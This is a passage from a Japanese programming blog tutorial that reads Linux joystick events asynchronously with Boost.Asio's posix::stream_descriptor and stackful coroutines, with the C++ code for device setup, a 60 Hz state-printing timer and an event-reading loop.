<span id="cb7-14"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb7-14" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;linux/joystick.h&gt;</span></span>
<span id="cb7-15"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb7-15" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;sys/ioctl.h&gt;</span></span>
<span id="cb7-16"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb7-16" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;unistd.h&gt;</span></span>
<span id="cb7-17"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb7-17" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
<p>Joystick と <code>posix::stream_descriptor</code> の初期化周りのコードがこんな感じ。最初に示したコードでは、<code>posix::stream_descriptor</code> のコンストラクタにファイルディスクリプタを渡していましたが、<code>io_context</code> のみを渡して初期化した後、メンバ関数 <a href="https://www.boost.org/doc/libs/1_68_0/doc/html/boost_asio/reference/posix__stream_descriptor/assign.html"><code>posix::stream_descriptor::assign</code></a> でファイルディスクリプタを割り当てることもできます。</p>
<div class="sourceCode" id="cb8"><pre class="sourceCode cpp"><code class="sourceCode cpp"><span id="cb8-1"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="kw">struct</span> joystick_state <span class="op">{</span></span>
<span id="cb8-2"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb8-2" aria-hidden="true" tabindex="-1"></a>  <span class="bu">std::</span>uint8_t<span class="op"> </span>num_axes<span class="op">;</span></span>
<span id="cb8-3"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb8-3" aria-hidden="true" tabindex="-1"></a>  <span class="bu">std::</span>uint8_t<span class="op"> </span>num_buttons<span class="op">;</span></span>
<span id="cb8-4"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb8-4" aria-hidden="true" tabindex="-1"></a>  <span class="bu">std::</span>vector<span class="op">&lt;</span><span class="bu">std::</span>int16_t<span class="op">&gt;</span> axes<span class="op">;</span></span>
<span id="cb8-5"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb8-5" aria-hidden="true" tabindex="-1"></a>  <span class="bu">std::</span>vector<span class="op">&lt;</span><span class="bu">std::</span>int16_t<span class="op">&gt;</span> buttons<span class="op">;</span></span>
<span id="cb8-6"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb8-6" aria-hidden="true" tabindex="-1"></a><span class="op">};</span></span>
<span id="cb8-7"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb8-7" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb8-8"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb8-8" aria-hidden="true" tabindex="-1"></a><span class="co">// ...</span></span>
<span id="cb8-9"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb8-9" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb8-10"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb8-10" aria-hidden="true" tabindex="-1"></a><span class="ex">boost::</span>asio<span class="ex">::</span>io_context<span class="op"> </span>ctx<span class="op">{};</span></span>
<span id="cb8-11"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb8-11" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb8-12"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb8-12" aria-hidden="true" tabindex="-1"></a><span class="ex">boost::</span>asio<span class="ex">::</span>posix<span class="ex">::</span>stream_descriptor<span class="op"> </span>joystick<span class="op">{</span>ctx<span class="op">};</span></span>
<span id="cb8-13"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb8-13" aria-hidden="true" tabindex="-1"></a>joystick_state state<span class="op">{};</span></span>
<span id="cb8-14"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb8-14" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
<span id="cb8-15"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb8-15" aria-hidden="true" tabindex="-1"></a>  <span class="at">const</span> <span class="dt">int</span> fd <span class="op">=</span> <span class="op">::</span>open<span class="op">(</span>argv<span class="op">[</span><span class="dv">1</span><span class="op">],</span> O_RDONLY<span class="op">);</span></span>
<span id="cb8-16"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb8-16" aria-hidden="true" tabindex="-1"></a>  <span class="cf">if</span> <span class="op">(</span>fd <span class="op">&lt;</span> <span class="dv">0</span><span class="op">)</span> <span class="op">{</span></span>
<span id="cb8-17"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb8-17" aria-hidden="true" tabindex="-1"></a>    <span class="bu">std::</span>cerr<span class="op"> &lt;&lt;</span> argv<span class="op">[</span><span class="dv">1</span><span class="op">]</span> <span class="op">&lt;&lt;</span> <span class="st">&quot;: &quot;</span> <span class="op">&lt;&lt;</span> <span class="bu">std::</span>strerror<span class="op">(</span>errno<span class="op">)</span> <span class="op">&lt;&lt;</span> <span class="bu">std::</span>endl<span class="op">;</span></span>
<span id="cb8-18"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb8-18" aria-hidden="true" tabindex="-1"></a>    <span class="bu">std::</span>exit<span class="op">(</span><span class="dv">1</span><span class="op">);</span></span>
<span id="cb8-19"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb8-19" aria-hidden="true" tabindex="-1"></a>  <span class="op">}</span></span>
<span id="cb8-20"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb8-20" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb8-21"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb8-21" aria-hidden="true" tabindex="-1"></a>  <span class="op">::</span>ioctl<span class="op">(</span>fd<span class="op">,</span> JSIOCGAXES<span class="op">,</span> <span class="op">&amp;</span>state<span class="op">.</span>num_axes<span class="op">);</span></span>
<span id="cb8-22"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb8-22" aria-hidden="true" tabindex="-1"></a>  state<span class="op">.</span>axes<span class="op">.</span>resize<span class="op">(</span>state<span class="op">.</span>num_axes<span class="op">);</span></span>
<span id="cb8-23"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb8-23" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb8-24"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb8-24" aria-hidden="true" tabindex="-1"></a>  <span class="op">::</span>ioctl<span class="op">(</span>fd<span class="op">,</span> JSIOCGBUTTONS<span class="op">,</span> <span class="op">&amp;</span>state<span class="op">.</span>num_buttons<span class="op">);</span></span>
<span id="cb8-25"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb8-25" aria-hidden="true" tabindex="-1"></a>  state<span class="op">.</span>buttons<span class="op">.</span>resize<span class="op">(</span>state<span class="op">.</span>num_buttons<span class="op">);</span></span>
<span id="cb8-26"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb8-26" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb8-27"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb8-27" aria-hidden="true" tabindex="-1"></a>  joystick<span class="op">.</span>assign<span class="op">(</span>fd<span class="op">);</span></span>
<span id="cb8-28"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb8-28" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
<p>上に書いたように、今回は stackful coroutine を使って非同期処理を書いていきます。<a href="https://www.boost.org/doc/libs/1_68_0/doc/html/boost_asio/reference/spawn.html"><code>spawn</code></a> を使って、一定時間毎 (1/60 [s]) に状態を表示するものと、Joystick のイベント監視 &amp; 内部状態更新をするものの2つの coroutine を起動します。<code>spawn</code> の第1引数には <code>io_context</code> を直接渡すこともできますが、<a href="https://www.boost.org/doc/libs/1_68_0/doc/html/boost_asio/reference/io_context__strand.html"><code>io_context::strand</code></a> を渡しています。今回のように <code>io_context</code> をシングルスレッドで利用している場合はあまり意味がありませんが、<code>io_context::strand</code> は登録されたハンドラを直列に (同時に実行されることなく) 実行するためのものです。</p>
<div class="sourceCode" id="cb9"><pre class="sourceCode cpp"><code class="sourceCode cpp"><span id="cb9-1"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb9-1" aria-hidden="true" tabindex="-1"></a><span class="ex">boost::</span>asio<span class="ex">::</span>io_context<span class="ex">::</span>strand<span class="op"> </span>strand<span class="op">{</span>ctx<span class="op">};</span></span>
<span id="cb9-2"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb9-2" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb9-3"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb9-3" aria-hidden="true" tabindex="-1"></a><span class="ex">boost::</span>asio<span class="ex">::</span>steady_timer<span class="op"> </span>timer<span class="op">{</span>ctx<span class="op">};</span></span>
<span id="cb9-4"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb9-4" aria-hidden="true" tabindex="-1"></a><span class="ex">boost::</span>asio<span class="ex">::</span>spawn<span class="op">(</span>strand<span class="op">,</span> <span class="op">[&amp;</span>state<span class="op">,</span> <span class="op">&amp;</span>timer<span class="op">](</span><span class="kw">auto</span><span class="op">&amp;&amp;</span> yield<span class="op">)</span> <span class="op">{</span></span>
<span id="cb9-5"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb9-5" aria-hidden="true" tabindex="-1"></a>  <span class="co">// 一定時間毎 (1/60 [s]) に状態を表示する</span></span>
<span id="cb9-6"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb9-6" aria-hidden="true" tabindex="-1"></a><span class="op">});</span></span>
<span id="cb9-7"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb9-7" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb9-8"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb9-8" aria-hidden="true" tabindex="-1"></a><span class="ex">boost::</span>asio<span class="ex">::</span>spawn<span class="op">(</span>strand<span class="op">,</span> <span class="op">[&amp;</span>joystick<span class="op">,</span> <span class="op">&amp;</span>state<span class="op">](</span><span class="kw">auto</span><span class="op">&amp;&amp;</span> yield<span class="op">)</span> <span class="op">{</span></span>
<span id="cb9-9"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb9-9" aria-hidden="true" tabindex="-1"></a>  <span class="co">// Joystick のイベント監視 &amp; 内部状態更新をする</span></span>
<span id="cb9-10"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb9-10" aria-hidden="true" tabindex="-1"></a><span class="op">});</span></span>
<span id="cb9-11"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb9-11" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb9-12"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb9-12" aria-hidden="true" tabindex="-1"></a>ctx<span class="op">.</span>run<span class="op">();</span></span></code></pre></div>
<p>一定時間毎 (1/60 [s]) に状態を表示する処理をしている coroutine の実装がこんな感じです。タイマーには <a href="https://www.boost.org/doc/libs/1_68_0/doc/html/boost_asio/reference/steady_timer.html"><code>steady_timer</code></a> を用いました。<code>timer</code> にあらかじめ次の発火時刻をセットしてから状態を表示し、その後次の発火まで待つ、を繰り返しているイメージです。</p>
<div class="sourceCode" id="cb10"><pre class="sourceCode cpp"><code class="sourceCode cpp"><span id="cb10-1"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb10-1" aria-hidden="true" tabindex="-1"></a><span class="kw">using</span> <span class="kw">namespace</span> <span class="bu">std::</span>chrono_literals<span class="op">;</span></span>
<span id="cb10-2"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb10-2" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb10-3"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb10-3" aria-hidden="true" tabindex="-1"></a><span class="co">// ...</span></span>
<span id="cb10-4"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb10-4" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb10-5"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb10-5" aria-hidden="true" tabindex="-1"></a><span class="ex">boost::</span>asio<span class="ex">::</span>steady_timer<span class="op"> </span>timer<span class="op">{</span>ctx<span class="op">};</span></span>
<span id="cb10-6"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb10-6" aria-hidden="true" tabindex="-1"></a><span class="ex">boost::</span>asio<span class="ex">::</span>spawn<span class="op">(</span>strand<span class="op">,</span> <span class="op">[&amp;</span>state<span class="op">,</span> <span class="op">&amp;</span>timer<span class="op">](</span><span class="kw">auto</span><span class="op">&amp;&amp;</span> yield<span class="op">)</span> <span class="op">{</span></span>
<span id="cb10-7"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb10-7" aria-hidden="true" tabindex="-1"></a>  <span class="cf">for</span> <span class="op">(;;)</span> <span class="op">{</span></span>
<span id="cb10-8"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb10-8" aria-hidden="true" tabindex="-1"></a>    timer<span class="op">.</span>expires_after<span class="op">(</span><span class="dv">16'666'666</span><span class="bu">ns</span><span class="op">);</span></span>
<span id="cb10-9"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb10-9" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb10-10"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb10-10" aria-hidden="true" tabindex="-1"></a>    <span class="bu">std::</span>printf<span class="op">(</span><span class="st">&quot;</span><span class="sc">\r</span><span class="st">&quot;</span><span class="op">);</span></span>
<span id="cb10-11"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb10-11" aria-hidden="true" tabindex="-1"></a>    <span class="bu">std::</span>printf<span class="op">(</span><span class="st">&quot;axes: &quot;</span><span class="op">);</span></span>
<span id="cb10-12"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb10-12" aria-hidden="true" tabindex="-1"></a>    <span class="cf">for</span> <span class="op">(</span><span class="kw">auto</span><span class="op">&amp;&amp;</span> v <span class="op">:</span> state<span class="op">.</span>axes<span class="op">)</span> <span class="op">{</span></span>
<span id="cb10-13"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb10-13" aria-hidden="true" tabindex="-1"></a>      <span class="bu">std::</span>printf<span class="op">(</span><span class="st">&quot;%6&quot;</span> PRId16 <span class="st">&quot; &quot;</span><span class="op">,</span> v<span class="op">);</span></span>
<span id="cb10-14"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb10-14" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
<span id="cb10-15"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb10-15" aria-hidden="true" tabindex="-1"></a>    <span class="bu">std::</span>printf<span class="op">(</span><span class="st">&quot;buttons: &quot;</span><span class="op">);</span></span>
<span id="cb10-16"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb10-16" aria-hidden="true" tabindex="-1"></a>    <span class="cf">for</span> <span class="op">(</span><span class="kw">auto</span><span class="op">&amp;&amp;</span> v <span class="op">:</span> state<span class="op">.</span>buttons<span class="op">)</span> <span class="op">{</span></span>
<span id="cb10-17"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb10-17" aria-hidden="true" tabindex="-1"></a>      <span class="bu">std::</span>printf<span class="op">(</span><span class="st">&quot;%&quot;</span> PRId16 <span class="st">&quot; &quot;</span><span class="op">,</span> v<span class="op">);</span></span>
<span id="cb10-18"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb10-18" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
<span id="cb10-19"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb10-19" aria-hidden="true" tabindex="-1"></a>    <span class="bu">std::</span>fflush<span class="op">(</span>stdout<span class="op">);</span></span>
<span id="cb10-20"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb10-20" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb10-21"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb10-21" aria-hidden="true" tabindex="-1"></a>    timer<span class="op">.</span>async_wait<span class="op">(</span>yield<span class="op">);</span></span>
<span id="cb10-22"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb10-22" aria-hidden="true" tabindex="-1"></a>  <span class="op">}</span></span>
<span id="cb10-23"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb10-23" aria-hidden="true" tabindex="-1"></a><span class="op">});</span></span></code></pre></div>
<p>続いて Joystick のイベント監視 &amp; 内部状態更新をするほうの coroutine の実装がこんな感じです。<code>joystick</code> からの読み込みを <a href="https://www.boost.org/doc/libs/1_68_0/doc/html/boost_asio/reference/async_read/overload1.html"><code>async_read</code></a> で行います。今回は読み込む量が決まっているので、<a href="https://www.boost.org/doc/libs/1_68_0/doc/html/boost_asio/reference/streambuf.html"><code>streambuf</code></a> は使わず、<a href="https://www.boost.org/doc/libs/1_68_0/doc/html/boost_asio/reference/buffer/overload5.html"><code>buffer</code></a> を使って <code>js_event</code> に直接読み込みます。<code>async_read</code> で読み込む量の指定は第3引数に <a href="https://www.boost.org/doc/libs/1_68_0/doc/html/boost_asio/reference/async_read.html"><code>CompletionCondition</code></a> を取る overload に <a href="https://www.boost.org/doc/libs/1_68_0/doc/html/boost_asio/reference/transfer_exactly.html"><code>transfer_exactly</code></a> を渡すなどでも可能ですが、以下の実装で <code>async_read</code> の処理が完了する条件はドキュメントにあるとおり与えたバッファが一杯になる、またはエラーが発生したときとあるので、これで問題ないでしょう。</p>
<div class="sourceCode" id="cb11"><pre class="sourceCode cpp"><code class="sourceCode cpp"><span id="cb11-1"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb11-1" aria-hidden="true" tabindex="-1"></a><span class="ex">boost::</span>asio<span class="ex">::</span>spawn<span class="op">(</span>strand<span class="op">,</span> <span class="op">[&amp;</span>joystick<span class="op">,</span> <span class="op">&amp;</span>state<span class="op">](</span><span class="kw">auto</span><span class="op">&amp;&amp;</span> yield<span class="op">)</span> <span class="op">{</span></span>
<span id="cb11-2"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb11-2" aria-hidden="true" tabindex="-1"></a>  <span class="cf">for</span> <span class="op">(;;)</span> <span class="op">{</span></span>
<span id="cb11-3"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb11-3" aria-hidden="true" tabindex="-1"></a>    <span class="op">::</span>js_event jse<span class="op">{};</span></span>
<span id="cb11-4"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb11-4" aria-hidden="true" tabindex="-1"></a>    <span class="ex">boost::</span>system<span class="ex">::</span>error_code<span class="op"> </span>error<span class="op">{};</span></span>
<span id="cb11-5"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb11-5" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb11-6"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb11-6" aria-hidden="true" tabindex="-1"></a>    <span class="ex">boost::</span>asio<span class="ex">::</span>async_read<span class="op">(</span>joystick<span class="op">,</span> <span class="ex">boost::</span>asio<span class="ex">::</span>buffer<span class="op">(&amp;</span>jse<span class="op">,</span> <span class="kw">sizeof</span> jse<span class="op">),</span> yield<span class="op">[</span>error<span class="op">]);</span></span>
<span id="cb11-7"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb11-7" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb11-8"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb11-8" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="op">(</span>error <span class="op">==</span> <span class="ex">boost::</span>asio<span class="ex">::</span>error<span class="ex">::</span>eof<span class="op">)</span> <span class="op">{</span></span>
<span id="cb11-9"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb11-9" aria-hidden="true" tabindex="-1"></a>      joystick<span class="op">.</span>get_io_service<span class="op">().</span>stop<span class="op">();</span></span>
<span id="cb11-10"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb11-10" aria-hidden="true" tabindex="-1"></a>      <span class="cf">break</span><span class="op">;</span></span>
<span id="cb11-11"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb11-11" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span> <span class="cf">else</span> <span class="cf">if</span> <span class="op">(</span>error<span class="op">)</span> <span class="op">{</span></span>
<span id="cb11-12"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb11-12" aria-hidden="true" tabindex="-1"></a>      <span class="bu">std::</span>cerr<span class="op"> &lt;&lt;</span> <span class="st">&quot;</span><span class="sc">\n</span><span class="st">error: &quot;</span> <span class="op">&lt;&lt;</span> error<span class="op">.</span>message<span class="op">()</span> <span class="op">&lt;&lt;</span> <span class="bu">std::</span>endl<span class="op">;</span></span>
<span id="cb11-13"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb11-13" aria-hidden="true" tabindex="-1"></a>      <span class="bu">std::</span>exit<span class="op">(</span><span class="dv">1</span><span class="op">);</span></span>
<span id="cb11-14"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb11-14" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
<span id="cb11-15"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb11-15" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb11-16"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb11-16" aria-hidden="true" tabindex="-1"></a>    <span class="cf">switch</span> <span class="op">(</span>jse<span class="op">.</span>type <span class="op">&amp;</span> <span class="op">~</span>JS_EVENT_INIT<span class="op">)</span> <span class="op">{</span></span>
<span id="cb11-17"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb11-17" aria-hidden="true" tabindex="-1"></a>      <span class="cf">case</span> JS_EVENT_AXIS<span class="op">:</span></span>
<span id="cb11-18"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb11-18" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="op">(</span>jse<span class="op">.</span>number <span class="op">&lt;</span> state<span class="op">.</span>num_axes<span class="op">)</span> <span class="op">{</span></span>
<span id="cb11-19"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb11-19" aria-hidden="true" tabindex="-1"></a>          state<span class="op">.</span>axes<span class="op">.</span>at<span class="op">(</span>jse<span class="op">.</span>number<span class="op">)</span> <span class="op">=</span> jse<span class="op">.</span>value<span class="op">;</span></span>
<span id="cb11-20"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb11-20" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span></span>
<span id="cb11-21"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb11-21" aria-hidden="true" tabindex="-1"></a>        <span class="cf">break</span><span class="op">;</span></span>
<span id="cb11-22"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb11-22" aria-hidden="true" tabindex="-1"></a>      <span class="cf">case</span> JS_EVENT_BUTTON<span class="op">:</span></span>
<span id="cb11-23"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb11-23" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="op">(</span>jse<span class="op">.</span>number <span class="op">&lt;</span> state<span class="op">.</span>num_buttons<span class="op">)</span> <span class="op">{</span></span>
<span id="cb11-24"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb11-24" aria-hidden="true" tabindex="-1"></a>          state<span class="op">.</span>buttons<span class="op">.</span>at<span class="op">(</span>jse<span class="op">.</span>number<span class="op">)</span> <span class="op">=</span> jse<span class="op">.</span>value<span class="op">;</span></span>
<span id="cb11-25"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb11-25" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span></span>
<span id="cb11-26"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb11-26" aria-hidden="true" tabindex="-1"></a>        <span class="cf">break</span><span class="op">;</span></span>
<span id="cb11-27"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb11-27" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
<span id="cb11-28"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb11-28" aria-hidden="true" tabindex="-1"></a>  <span class="op">}</span></span>
<span id="cb11-29"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb11-29" aria-hidden="true" tabindex="-1"></a><span class="op">});</span></span></code></pre></div>
<p>これで必要な実装は完了です。ソースコード全体がこんな感じになります。</p>
<div class="sourceCode" id="cb12"><pre class="sourceCode cpp"><code class="sourceCode cpp"><span id="cb12-1"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-1" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;chrono&gt;</span></span>
<span id="cb12-2"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-2" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;cinttypes&gt;</span></span>
<span id="cb12-3"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-3" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;cstdint&gt;</span></span>
<span id="cb12-4"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-4" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;cstdlib&gt;</span></span>
<span id="cb12-5"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-5" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;iostream&gt;</span></span>
<span id="cb12-6"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-6" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;vector&gt;</span></span>
<span id="cb12-7"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-7" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb12-8"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-8" aria-hidden="true" tabindex="-1"></a><span class="pp">#define BOOST_COROUTINES_NO_DEPRECATION_WARNING</span></span>
<span id="cb12-9"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-9" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;boost/asio.hpp&gt;</span></span>
<span id="cb12-10"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-10" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;boost/asio/spawn.hpp&gt;</span></span>
<span id="cb12-11"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-11" aria-hidden="true" tabindex="-1"></a></span>
